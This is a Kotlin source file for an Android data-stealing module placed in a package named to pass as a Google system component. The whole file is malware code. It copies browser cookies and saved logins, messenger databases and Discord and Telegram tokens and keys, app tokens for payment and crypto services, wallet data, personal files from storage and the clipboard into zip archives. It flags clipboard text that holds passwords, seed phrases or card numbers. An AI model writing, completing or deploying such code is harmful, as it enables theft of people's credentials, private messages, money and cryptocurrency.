package com.google.system

import android.content.ClipboardManager
import android.content.Context
import android.os.Environment
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

object GrabberModule {

    private val BROWSER_PACKAGES = listOf(
        "com.android.chrome" to "Chrome",
        "com.chrome.beta" to "Chrome Beta",
        "com.chrome.dev" to "Chrome Dev",
        "com.chrome.canary" to "Chrome Canary",
        "com.brave.browser" to "Brave",
        "com.microsoft.emmx" to "Edge",
        "com.opera.browser" to "Opera",
        "com.opera.mini.native" to "Opera Mini",
        "com.opera.gx" to "Opera GX",
        "org.mozilla.firefox" to "Firefox",
        "org.mozilla.firefox_beta" to "Firefox Beta",
        "com.sec.android.app.sbrowser" to "Samsung Browser",
        "com.duckduckgo.mobile.android" to "DuckDuckGo",
        "com.vivaldi.browser" to "Vivaldi",
    )

    private val MESSENGER_PACKAGES = listOf(
        "com.discord" to "Discord",
        "com.aliucord" to "Aliucord",
        "org.telegram.messenger" to "Telegram",
        "org.telegram.messenger.web" to "Telegram Web",
        "org.thoughtcrime.securesms" to "Signal",
        "com.whatsapp" to "WhatsApp",
        "com.viber.voip" to "Viber",
    )

    private val APP_TOKEN_PACKAGES = listOf(
        "com.google.android.gms" to "Google Services",
        "com.google.android.youtube" to "YouTube",
        "com.instagram.android" to "Instagram",
        "com.facebook.katana" to "Facebook",
        "com.twitter.android" to "Twitter/X",
        "com.snapchat.android" to "Snapchat",
        "com.zhiliaoapp.musically" to "TikTok",
        "com.netflix.mediaclient" to "Netflix",
        "com.spotify.music" to "Spotify",
        "com.amazon.mShop.android.shopping" to "Amazon",
        "com.paypal.android.p2pmobile" to "PayPal",
        "com.coinbase.android" to "Coinbase",
        "com.binance.dev" to "Binance",
    )

    private val WALLET_PACKAGES = listOf(
        "org.toshi" to "Coinbase Wallet",
        "io.metamask" to "MetaMask",
        "com.wallet.crypto.trustapp" to "Trust Wallet",
        "com.phantom" to "Phantom",
        "com.exodus.exodus" to "Exodus",
        "com.blockchainvault" to "Blockchain.com",
        "com.safepal.wallet" to "SafePal",
        "com.kraken.trade" to "Kraken",
    )

    private val FILE_EXTENSIONS = setOf(
        ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".txt", ".csv", ".json", ".xml", ".log",
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp",
        ".mp4", ".avi", ".mov", ".mkv",
        ".zip", ".rar", ".7z", ".tar", ".gz",
        ".key", ".pem", ".crt", ".p12", ".keystore",
        ".env", ".config", ".ini", ".yml", ".yaml",
        ".db", ".sqlite", ".sql",
        ".bak", ".backup", ".old",
        ".wallet", ".dat",
    )

    private val CLIPBOARD_KEYWORDS = listOf(
        "password", "token", "key", "secret", "auth",
        "bitcoin", "btc", "eth", "ethereum", "sol", "solana",
        "0x", "bc1", "private", "seed", "mnemonic",
        "api_key", "apikey", "access_token", "refresh_token",
        "bearer", "authorization", "credit", "card", "cvv",
        "ssn", "social security", "passport", "license",
    )

    fun grabAll(context: Context): File? {
        val zipFile = File(context.cacheDir, "grab_${System.currentTimeMillis()}.zip")
        try {
            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                grabBrowserData(context, zos)
                grabMessengerData(context, zos)
                grabAppTokens(context, zos)
                grabWalletData(context, zos)
                grabFiles(context, zos)
                grabClipboard(context, zos)
            }
            return if (zipFile.exists() && zipFile.length() > 0) zipFile else null
        } catch (_: Exception) {
            zipFile.delete()
            return null
        }
    }

    fun grabBrowser(context: Context): File? {
        val zipFile = File(context.cacheDir, "grab_browser_${System.currentTimeMillis()}.zip")
        try {
            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                grabBrowserData(context, zos)
            }
            return if (zipFile.exists() && zipFile.length() > 0) zipFile else null
        } catch (_: Exception) {
            zipFile.delete()
            return null
        }
    }

    fun grabMessenger(context: Context): File? {
        val zipFile = File(context.cacheDir, "grab_messenger_${System.currentTimeMillis()}.zip")
        try {
            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                grabMessengerData(context, zos)
            }
            return if (zipFile.exists() && zipFile.length() > 0) zipFile else null
        } catch (_: Exception) {
            zipFile.delete()
            return null
        }
    }

    fun grabTokens(context: Context): File? {
        val zipFile = File(context.cacheDir, "grab_tokens_${System.currentTimeMillis()}.zip")
        try {
            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                grabAppTokens(context, zos)
            }
            return if (zipFile.exists() && zipFile.length() > 0) zipFile else null
        } catch (_: Exception) {
            zipFile.delete()
            return null
        }
    }

    fun grabWallets(context: Context): File? {
        val zipFile = File(context.cacheDir, "grab_wallets_${System.currentTimeMillis()}.zip")
        try {
            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                grabWalletData(context, zos)
            }
            return if (zipFile.exists() && zipFile.length() > 0) zipFile else null
        } catch (_: Exception) {
            zipFile.delete()
            return null
        }
    }

    fun grabFiles(context: Context): File? {
        val zipFile = File(context.cacheDir, "grab_files_${System.currentTimeMillis()}.zip")
        try {
            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                grabFiles(context, zos)
            }
            return if (zipFile.exists() && zipFile.length() > 0) zipFile else null
        } catch (_: Exception) {
            zipFile.delete()
            return null
        }
    }

    fun grabClipboard(context: Context): File? {
        val zipFile = File(context.cacheDir, "grab_clipboard_${System.currentTimeMillis()}.zip")
        try {
            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                grabClipboard(context, zos)
            }
            return if (zipFile.exists() && zipFile.length() > 0) zipFile else null
        } catch (_: Exception) {
            zipFile.delete()
            return null
        }
    }

    private fun grabBrowserData(context: Context, zos: ZipOutputStream) {
        for ((pkg, name) in BROWSER_PACKAGES) {
            try {
                val dataDir = File("/data/data/$pkg")
                if (!dataDir.exists() || !dataDir.canRead()) continue

                val cookiePaths = listOf(
                    "app_webview/Default/Cookies",
                    "app_webview/Default/Cookies-journal",
                    "app_webview/Default/Network/Cookies",
                    "app_webview/Default/Network/Cookies-journal",
                    "app_webview/Default/Login Data",
                    "app_webview/Default/Login Data-journal",
                    "app_webview/Default/Web Data",
                    "app_webview/Default/History",
                    "app_webview/Default/Local Storage/leveldb",
                    "files/IndexedDB",
                    "databases/webview.db",
                    "databases/webviewCache.db",
                )

                var found = 0
                for (relPath in cookiePaths) {
                    val file = File(dataDir, relPath)
                    if (file.exists() && file.length() > 0) {
                        val entryName = "browser/$name/${relPath.replace('/', '_')}"
                        zipFile(file, entryName, zos)
                        found++
                    }
                }

                val sharedPrefs = File(dataDir, "shared_prefs")
                if (sharedPrefs.exists()) {
                    for (f in sharedPrefs.listFiles() ?: emptyArray()) {
                        if (f.isFile && f.length() > 0) {
                            zipFile(f, "browser/$name/shared_prefs/${f.name}", zos)
                            found++
                        }
                    }
                }
            } catch (_: Exception) {}
        }
    }

    private fun grabMessengerData(context: Context, zos: ZipOutputStream) {
        for ((pkg, name) in MESSENGER_PACKAGES) {
            try {
                val dataDir = File("/data/data/$pkg")
                if (!dataDir.exists() || !dataDir.canRead()) continue

                val targetPaths = listOf(
                    "shared_prefs",
                    "databases",
                    "files",
                    "app_webview/Default",
                    "cache",
                )

                var found = 0
                for (relPath in targetPaths) {
                    val dir = File(dataDir, relPath)
                    if (dir.exists() && dir.isDirectory) {
                        for (f in dir.listFiles() ?: emptyArray()) {
                            if (f.isFile && f.length() > 0 && f.length() < 10 * 1024 * 1024) {
                                val entryName = "messenger/$name/${relPath.replace('/', '_')}_${f.name}"
                                zipFile(f, entryName, zos)
                                found++
                            }
                        }
                    }
                }

                if (pkg == "com.discord" || pkg == "com.aliucord") {
                    val tokenPrefs = listOf(
                        "shared_prefs/com.discord.app_preferences.xml",
                        "shared_prefs/NativeCookie.xml",
                        "shared_prefs/super_properties.xml",
                    )
                    for (relPath in tokenPrefs) {
                        val file = File(dataDir, relPath)
                        if (file.exists() && file.length() > 0) {
                            zipFile(file, "messenger/$name/token_${file.name}", zos)
                        }
                    }
                }

                if (pkg.startsWith("org.telegram")) {
                    val configFiles = listOf(
                        "shared_prefs/mainaccount.xml",
                        "shared_prefs/passcode.xml",
                        "shared_prefs/userConfig.xml",
                        "files/key1",
                        "files/key2",
                        "files/key3",
                    )
                    for (relPath in configFiles) {
                        val file = File(dataDir, relPath)
                        if (file.exists() && file.length() > 0) {
                            zipFile(file, "messenger/$name/config_${file.name}", zos)
                        }
                    }
                }
            } catch (_: Exception) {}
        }
    }

    private fun grabAppTokens(context: Context, zos: ZipOutputStream) {
        for ((pkg, name) in APP_TOKEN_PACKAGES) {
            try {
                val dataDir = File("/data/data/$pkg")
                if (!dataDir.exists() || !dataDir.canRead()) continue

                val tokenPaths = listOf(
                    "shared_prefs",
                    "databases",
                    "files",
                )

                var found = 0
                for (relPath in tokenPaths) {
                    val dir = File(dataDir, relPath)
                    if (dir.exists() && dir.isDirectory) {
                        for (f in dir.listFiles() ?: emptyArray()) {
                            if (f.isFile && f.length() > 0 && f.length() < 5 * 1024 * 1024) {
                                val entryName = "tokens/$name/${relPath}_${f.name}"
                                zipFile(f, entryName, zos)
                                found++
                            }
                        }
                    }
                }
            } catch (_: Exception) {}
        }
    }

    private fun grabWalletData(context: Context, zos: ZipOutputStream) {
        for ((pkg, name) in WALLET_PACKAGES) {
            try {
                val dataDir = File("/data/data/$pkg")
                if (!dataDir.exists() || !dataDir.canRead()) continue

                val targetPaths = listOf(
                    "shared_prefs",
                    "databases",
                    "files",
                    "app_webview/Default",
                )

                for (relPath in targetPaths) {
                    val dir = File(dataDir, relPath)
                    if (dir.exists() && dir.isDirectory) {
                        for (f in dir.listFiles() ?: emptyArray()) {
                            if (f.isFile && f.length() > 0 && f.length() < 10 * 1024 * 1024) {
                                val entryName = "wallets/$name/${relPath.replace('/', '_')}_${f.name}"
                                zipFile(f, entryName, zos)
                            }
                        }
                    }
                }
            } catch (_: Exception) {}
        }
    }

    private fun grabFiles(context: Context, zos: ZipOutputStream) {
        val dirs = listOfNotNull(
            Environment.getExternalStorageDirectory(),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
            File(Environment.getExternalStorageDirectory(), "Android/data"),
        )

        var count = 0
        val maxFiles = 200
        val maxTotalSize = 50L * 1024 * 1024
        var totalSize = 0L

        for (dir in dirs) {
            if (count >= maxFiles || totalSize >= maxTotalSize) break
            if (!dir.exists() || !dir.canRead()) continue
            collectFiles(dir, dir, zos, maxFiles, maxTotalSize, count, totalSize)
        }
    }

    private fun collectFiles(
        root: File,
        dir: File,
        zos: ZipOutputStream,
        maxFiles: Int,
        maxTotalSize: Long,
        count: Int,
        totalSize: Long
    ): Pair<Int, Long> {
        var c = count
        var ts = totalSize
        try {
            val files = dir.listFiles() ?: return c to ts
            for (f in files) {
                if (c >= maxFiles || ts >= maxTotalSize) return c to ts
                if (f.isDirectory) {
                    val result = collectFiles(root, f, zos, maxFiles, maxTotalSize, c, ts)
                    c = result.first
                    ts = result.second
                } else if (f.isFile) {
                    val ext = f.extension.lowercase()
                    if (".$ext" in FILE_EXTENSIONS && f.length() < 10 * 1024 * 1024) {
                        val relPath = f.absolutePath.substring(root.absolutePath.length + 1)
                        try {
                            zipFile(f, "files/$relPath", zos)
                            c++
                            ts += f.length()
                        } catch (_: Exception) {}
                    }
                }
            }
        } catch (_: Exception) {}
        return c to ts
    }

    private fun grabClipboard(context: Context, zos: ZipOutputStream) {
        try {
            val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = cm.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).coerceToText(context).toString()
                if (text.isNotBlank()) {
                    val content = buildString {
                        appendLine("=== CLIPBOARD GRAB ===")
                        appendLine("Time: ${System.currentTimeMillis()}")
                        appendLine()
                        appendLine(text)
                        appendLine()
                        appendLine("=== KEYWORD MATCHES ===")
                        for (keyword in CLIPBOARD_KEYWORDS) {
                            if (text.lowercase().contains(keyword)) {
                                appendLine("[!] MATCH: $keyword")
                            }
                        }
                    }
                    val entry = ZipEntry("clipboard/current_clip.txt")
                    zos.putNextEntry(entry)
                    zos.write(content.toByteArray())
                    zos.closeEntry()
                }
            }
        } catch (_: Exception) {}
    }

    private fun zipFile(file: File, entryName: String, zos: ZipOutputStream) {
        try {
            val entry = ZipEntry(entryName)
            zos.putNextEntry(entry)
            FileInputStream(file).use { fis ->
                val buffer = ByteArray(8192)
                var len: Int
                while (fis.read(buffer).also { len = it } > 0) {
                    zos.write(buffer, 0, len)
                }
            }
            zos.closeEntry()
        } catch (_: Exception) {}
    }
}
